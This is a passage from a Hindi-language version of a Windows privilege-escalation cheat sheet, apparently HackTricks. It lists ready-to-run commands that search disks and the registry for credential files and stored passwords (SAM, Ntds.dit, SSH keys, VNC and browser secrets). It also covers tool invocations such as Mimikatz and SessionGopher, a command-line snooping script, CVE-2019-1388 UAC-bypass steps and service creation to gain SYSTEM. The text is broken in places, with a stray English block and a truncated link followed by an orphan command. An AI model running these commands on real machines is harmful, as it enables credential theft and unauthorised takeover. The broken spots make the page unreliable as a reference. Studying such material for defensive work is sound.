dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### रीसाइकल बिन में क्रेडेंशियल्स

आपको बिन में क्रेडेंशियल्स की जांच करने के लिए भी देखना चाहिए।

कई प्रोग्रामों द्वारा सहेजे गए **पासवर्ड को पुनर्प्राप्त करने** के लिए आप इस्तेमाल कर सकते हैं: [http://www.nirsoft.net/password\_recovery\_tools.html](http://www.nirsoft.net/password\_recovery\_tools.html)

### रजिस्ट्री के अंदर

**क्रेडेंशियल्स के साथ अन्य संभावित रजिस्ट्री कुंजी**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**रजिस्ट्री से openssh कुंजी निकालें।**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### ब्राउज़र इतिहास

आपको देखना चाहिए कि क्या **Chrome या Firefox** से पासवर्ड संग्रहीत होते हैं।\
ब्राउज़रों के इतिहास, बुकमार्क और पसंदीदा भी देखें, इसलिए कुछ **पासवर्ड संग्रहीत हो सकते हैं**।

ब्राउज़रों से पासवर्ड निकालने के लिए उपकरण:

* Mimikatz: `dpapi::chrome`
* [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
* [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
* [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)\*\*\*\*

### **COM DLL Overwriting**

**Component Object Model (COM)** एक प्रौद्योगिकी है जो Windows ऑपरेटिंग सिस्टम के भीतर बनी हुई है और इसकी मदद से विभिन्न भाषाओं के सॉफ़्टवेयर घटकों के बीच **अंतरसंचार** संभव होती है। प्रत्येक COM घटक को **एक कक्षा आईडी (CLSID)** के माध्यम से पहचाना जाता है और प्रत्येक घटक एक या अधिक इंटरफ़ेस के माध्यम से विभिन्नता प्रदर्शित करता है, जिन्हें इंटरफ़ेस आईडी (IIDs) के माध्यम से पहचाना जाता है।

COM कक्षाएं और इंटरफ़ेस रजिस्ट्री में **HKEY\_**_**CLASSES\_**_**ROOT\CLSID** और **HKEY\_**_**CLASSES\_**_**ROOT\Interface** में परिभाषित की जाती हैं। यह रजिस्ट्री **HKEY\_**_**LOCAL\_**_**MACHINE\Software\Classes** + **HKEY\_**_**CURRENT\_**_**USER\Software\Classes** को मिलाकर बनाई जाती है = **HKEY\_**_**CLASSES\_**_**ROOT**।

इस रजिस्ट्री के CLSIDs के अंदर आपको एक बाल रजिस्ट्री **InProcServer32** मिलेगी जिसमें एक **डिफ़ॉल्ट मान** होता है जो एक **DLL** को पॉइंट करता है और एक मान होता है जिसे **ThreadingModel** कहा जाता है और यह **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single or Multi) या **Neutral** (Thread Neutral) हो सकता है।

![](<../../.gitbook/assets/image (638).png>)

मूल रूप से, यदि आप किसी भी DLL को **अधिलिखित कर सकते हैं** जो किसी अलग उपयोगकर्ता द्वारा निष्पादित की जाएगी, तो आप यदि वह DLL एक अलग उपयोगकर्ता द्वारा निष्पादित हो रही है तो **विशेषाधिकार बढ़ा सकते हैं**।

एक टिप्पणी के रूप में, यदि आप जानना चाहते हैं कि हमलावर कैसे COM Hijacking का उपयोग स्थायित्व में करते हैं, तो निम्नलिखित को देखें:

{% content-ref url="com-hijacking.md" %}
[com-hijacking.md](com-hijacking.md)
{% endcontent-ref %}

### **फ़ाइलों और रजिस्ट्री में जीनेरिक पासवर्ड खोजें**

**फ़ाइल सामग्री की खोज करें**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**किसी निश्चित फ़ाइल नाम के लिए फ़ाइल खोजें**

To search for a file with a certain filename, you can use the following command:

```bash
dir /s /b C:\filename.txt
```

This command will search for the file named `filename.txt` in the `C:\` directory and its subdirectories. The `/s` flag ensures that the search is performed recursively, and the `/b` flag displays only the file path without any additional information.
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**रजिस्ट्री में कुंजी नाम और पासवर्ड खोजें**

आप रजिस्ट्री में कुंजी नाम और पासवर्ड खोजने के लिए निम्नलिखित कमांड का उपयोग कर सकते हैं:
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### पासवर्ड खोजने वाले उपकरण

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **एक msf** प्लगइन है जिसे मैंने बनाया है, इस प्लगइन का उपयोग करके आपको विक्टिम के भीतर पासवर्ड खोजने वाले हर metasploit POST मॉड्यूल को स्वचालित रूप से चलाने की सुविधा मिलती है।\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) स्वचालित रूप से इस पृष्ठ में उल्लेखित पासवर्ड वाले सभी फ़ाइलें खोजता है।\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) एक और शानदार उपकरण है जो सिस्टम से पासवर्ड निकालता है।

उपकरण [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **सत्र**, **उपयोगकर्ता नाम** और **पासवर्ड** की खोज करता है जो कई उपकरणों में साफ टेक्स्ट में इस डेटा को सहेजते हैं (PuTTY, WinSCP, FileZilla, SuperPuTTY, और RDP)।
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## लीक हैंडलर्स

सोचिए कि **सिस्टम के रूप में चल रही प्रक्रिया ने पूरी पहुंच के साथ एक नई प्रक्रिया खोली** (`OpenProcess()`)। वही प्रक्रिया **एक नई प्रक्रिया बनाती है** (`CreateProcess()`) **कम अधिकारों के साथ, लेकिन मुख्य प्रक्रिया के सभी खुले हैंडल्स को अनुग्रहित करती है**।\
फिर, यदि आपके पास **कम अधिकारों वाली प्रक्रिया के पूरी पहुंच है**, तो आप **OpenProcess()** के साथ बनाई गई **उच्चाधिकारिक प्रक्रिया के खुले हैंडल को पकड़ सकते हैं** और एक शैलकोड इंजेक्ट कर सकते हैं।\
[**इस उदाहरण को पढ़ें और इस संकट को कैसे पता लगाएं और इसका शोषण करें** के बारे में अधिक जानकारी के लिए।](leaked-handle-exploitation.md)\
[**अधिक विस्तृत समझ के लिए इस दूसरे पोस्ट को पढ़ें, जिसमें विभिन्न स्तरों के अनुमतियों के साथ विरासत में मिले हुए प्रक्रियाओं और धागों के अधिक खुले हैंडल्स का परीक्षण और दुरुपयोग करने के बारे में एक और पोस्ट](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/) है।

## नेम्ड पाइप क्लाइंट अनुकरण

`पाइप` एक साझा मेमोरी ब्लॉक है जिसका उपयोग प्रक्रियाओं को संचार और डेटा विनिमय के लिए कर सकती हैं।

`नेम्ड पाइप्स` एक Windows मेकेनिज़्म है जो दो असंबंधित प्रक्रियाओं को एक दूसरे के बीच डेटा विनिमय करने की सुविधा प्रदान करता है, यद्यपि प्रक्रियाएँ दो अलग-अलग नेटवर्कों पर स्थित हों। यह क्लाइंट/सर्वर आर्किटेक्चर के बहुत समान है क्योंकि `नेम्ड पाइप सर्वर` और `नेम्ड पाइप क्लाइंट` जैसे धारणाएँ मौजूद होती हैं।

जब एक **क्लाइंट पाइप पर लिखता है**, तो पाइप को बनाने वाला **सर्वर** उस **क्लाइंट का अनुकरण कर सकता है** अगर उसके पास **SeImpersonate** अधिकार हैं। फिर, यदि आप **एक उच्चाधिकारिक प्रक्रिया को ढूंढ़ सकते हैं जो आपके द्वारा अनुकरण किए जाने वाले किसी भी पाइप पर लिखेगी**, तो आप उस प्रक्रिया के अनुकरण करके अधिकारों को बढ़ा सकते हैं। [**इसे कैसे कार्यान्वित करने के लिए इसे पढ़ें**](named-pipe-client-impersonation.md) **या** [**यह**](./#from-high-integrity-to-system)**।**

**इस टूल के माध्यम से एक नेम्ड पाइप संचार को burp जैसे टूल के साथ अवरोधित किया जा सकता है:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **और यह टूल प्राइवेस्क्स को खोजने के लिए सभी पाइप्स को सूचीबद्ध करने और देखने की अनुमति देता है** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)****

## विविध

### **पासवर्ड के लिए कमांड लाइन की निगरानी**

जब आप एक उपयोगकर्ता के रूप में शैल मिलता है, तो निर्धारित समय के बाद चल रही निर्धारित कार्य या अन्य प्रक्रियाएं हो सकती हैं जो **कमांड लाइन पर क्रेडेंशियल्स पास करती हैं**। नीचे दिए गए स्क्रिप्ट में हर दो सेकंड में प्रक्रिया के कमांड लाइन को कैप्चर किया जाता है और वर्तमान स्थिति को पिछली स्थिति के साथ तुलना करता है, किसी भी अंतर को आउटपुट करता है।
```powershell
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## निम्न प्रिविलेज उपयोगकर्ता से NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass तक

यदि आपके पास ग्राफिकल इंटरफ़ेस (कंसोल या RDP के माध्यम से) और UAC सक्षम है, तो कुछ Microsoft Windows के संस्करणों में एक अनुप्रिविलेज्ड उपयोगकर्ता से टर्मिनल या किसी अन्य प्रक्रिया जैसे "NT\AUTHORITY SYSTEM" चलाना संभव होता है।

इससे यह संभव होता है कि उच्चाधिकार और UAC को एक साथ उन्नत किया जा सके और इसी संक्रमण के साथ UAC को छोड़ा जा सके। इसके अलावा, कुछ भी स्थापित करने की आवश्यकता नहीं होती है और प्रक्रिया के दौरान उपयोग किया जाने वाला बाइनरी, Microsoft द्वारा हस्ताक्षरित और जारी किया जाता है।

कुछ प्रभावित सिस्टमों में निम्नलिखित शामिल हैं:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
इस दुर्बलता का शोषण करने के लिए, निम्नलिखित कदमों को करना आवश्यक है:

```
1) HHUPD.EXE फ़ाइल पर दायां क्लिक करें और इसे व्यवस्थापक के रूप में चलाएं।

2) UAC प्रॉम्प्ट आने पर, "अधिक विवरण दिखाएं" का चयन करें।

3) "प्रमाणपत्र जारी करने वाले" URL लिंक पर क्लिक करने पर, डिफ़ॉल्ट वेब ब्राउज़र दिख सकता है।

4) साइट पूरी तरह से लोड होने का इंतजार करें और "Save as" का चयन करें ताकि एक explorer.exe विंडो आए।

5) एक्सप्लोरर विंडो के पते मार्ग में, cmd.exe, powershell.exe या किसी अन्य इंटरैक्टिव प्रक्रिया दर्ज करें।

6) अब आपके पास "NT\AUTHORITY SYSTEM" कमांड प्रॉम्प्ट होगा।

7) अपने डेस्कटॉप पर वापस आने के लिए सेटअप और UAC प्रॉम्प्ट को रद्द करना न भूलें।
```

आपके पास इस GitHub रिपॉजिटरी में सभी आवश्यक फ़ाइलें और जानकारी हैं:

https://github.com/jas502n/CVE-2019-1388

## व्यवस्थापक माध्यम से उच्च अखंडता स्तर / UAC बाईपास

**अखंडता स्तर के बारे में जानने के लिए यह पढ़ें:**

{% content-ref url="integrity-levels.md" %}
[integrity-levels.md](integrity-levels.md)
{% endcontent-ref %}

फिर **UAC और UAC बाईपास के बारे में जानने के लिए यह पढ़ें:**

{% content-ref url="../windows-security-controls/uac-user-account-control.md" %}
[uac-user-account-control.md](../windows-security-controls/uac-user-account-control.md)
{% endcontent-ref %}

## **उच्च अखंडता से सिस्टम तक**

### **नई सेवा**

यदि आप पहले से ही उच्च अखंडता प्रक्रिया पर चल रहे हैं, तो **सिस्टम तक पहुंच** आसान हो सकता है, बस **एक नई सेवा बनाएं और इसे निष्पादित करें**:
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
### AlwaysInstallElevated

एक उच्च अवधि प्रक्रिया से आपको **AlwaysInstallElevated रजिस्ट्री प्रविष्टियों को सक्षम करने** और एक _**.msi**_ रैपर का उपयोग करके एक प्रतिवर्ती शैल को **स्थापित** करने का प्रयास कर सकते हैं।\
[इसके बारे में अधिक जानकारी रजिस्ट्री कुंजीयों और एक _.msi_ पैकेज को कैसे स्थापित करें यहां देखें।](./#alwaysinstallelevated)

### High + SeImpersonate विशेषाधिकार को सिस्टम में

**आप** [**यहां कोड देख सकते हैं**](seimpersonate-from-high-to-system.md)**।**

### SeDebug + SeImpersonate से पूर्ण टोकन विशेषाधिकारों तक

यदि आपके पास वे टोकन विशेषाधिकार हैं (संभवतः आपको इसे पहले से ही उच्च अवधि प्रक्रिया में मिलेगा), तो आप **लगभग किसी भी प्रक्रिया को खोल सकेंगे** (संरक्षित प्रक्रियाएं नहीं) SeDebug विशेषाधिकार के साथ, प्रक्रिया के **टोकन की प्रतिलिपि** बनाएं, और उस टोकन के साथ **एक अनियमित प्रक्रिया बनाएं**।\
इस तकनीक का उपयोग आमतौर पर **सिस्टम के रूप में चल रही किसी भी प्रक्रिया का चयन किया जाता है जिसमें सभी टोकन विशेषाधिकार होते हैं** (_हाँ, आप टोकन विशेषाधिकारों के साथ सिस्टम प्रक्रियाएं ढूंढ सकते हैं जिनमें सभी टोकन विशेषाधिकार नहीं होते हैं_)।\
**आप यहां एक** [**प्रस्तावित तकनीक को निष्पादित करने वाले कोड का उदाहरण देख सकते हैं**](sedebug-+-seimpersonate-copy-token.md)**।**

### **नामित पाइप्स**

यह तकनीक मीटरप्रेटर द्वारा `getsystem` में उन्नति के लिए उपयोग की जाती है। तकनीक का सिद्धांत है **एक पाइप बनाना और फिर उस पाइप पर लिखने के लिए एक सेवा बनाना/दुरुपयोग करना**। फिर, पाइप क्लाइंट (सेवा) के टोकन की **अनुकरण** करने के लिए पाइप को बनाने वाला **सर्वर** (जो **`SeImpersonate`** विशेषाधिकार का उपयोग करता है) सिस्टम विशेषाधिकार प्राप्त करेगा।\
यदि आप [**नामित पाइप क्लाइंट अनुकरण के बारे में और अधिक जानना चाहते हैं तो यहां पढ़ें**](./#named-pipe-client-impersonation)।\
यदि आप [**उच्च अवधि से सिस्टम तक जाने के लिए नामित पाइप का उपयोग करके कैसे करें इसका एक उदाहरण पढ़ना चाहते हैं तो यहां पढ़ें**](from-high-integrity-to-system-with-name-pipes.md)।

### Dll Hijacking

यदि आप **सिस्टम** के रूप में चल रही **प्रक्रिया** द्वारा **लोड** हो रही **एक dll को हाइजैक** करने में सफल होते हैं, तो आप उन अनुमतियों के साथ विचारहीन कोड को निष्पादित कर सकेंगे। इसलिए Dll Hijacking इस प्रकार के विशेषाधिकार उन्नति के लिए भी उपयोगी है, और इससे अधिक मात्रा में उच्च अवधि प्रक्रिया से प्राप्त करना आसान होता है क्योंकि इसके पास dlls लोड करने के लिए उपयोग किए जाने वाले फ़ोल्डरों पर **लेखन अनुमतियाँ** होती हैं।\
**आप यहां Dll हाइजैकिंग के बारे में अधिक जानकारी पा सकते हैं** [**यहां पढ़ें**](dll-hijacking.md)**।**

### **व्यवस्थापक या नेटवर्क सेवा से सिस्टम तक**

{% embed url="https://github.com/sailay1996/RpcSsImpersonator" %}

### LOCAL SERVICE या NETWORK SERVICE से पूर्ण विशेषाधिकारों तक

**पढ़ें:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## अधिक मदद

[स्थिर impacket बाइनरी](https://github.com/ropnop/impacket\_static\_binaries)

## उपयोगी उपकरण

**Windows स्थानीय विशेषाधिकार उन्नति वेक्टर्स के लिए सर्वश्रेष्ठ उपकरण:** [**WinPEAS**](https://github.com/carlospolop/
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## संदर्भ

[http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)\
[http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)\
[http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)\
[https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)\
[https://www.youtube.com/watch?v=\_8xJaaQlpBo](https://www.youtube.com/watch?v=\_8xJaaQlpBo)\
[https://sushant747.gitbooks.io/total-oscp-guide/privilege\_escalation\_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege\_escalation\_windows.html)\
[https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)\
[https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)\
[https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)\
[https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)\
[https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)\
[https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)\
[http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)\
[https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* क्या आप किसी **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप चाहते हैं कि आपकी **कंपनी HackTricks में विज्ञापित** की जाए? या क्या आप **PEASS के नवीनतम संस्करण का उपयोग करना चाहते हैं या HackTricks को PDF में डाउनलोड करना चाहते हैं**? [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) की जांच करें!
* खोजें [**The PEASS Family**](https://opensea.io/collection/the-peass-family), हमारा विशेष [**NFT**](https://opensea.io/collection/the-peass-family) संग्रह,
* प्राप्त करें [**आधिकारिक PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **शामिल हों** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) में या मुझे **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)** का** **अनुसरण** करें।**
* **अपने हैकिंग ट्रिक्स को हमें PR के माध्यम से सबमिट करके** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **और** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **को साझा करें।**

</details>
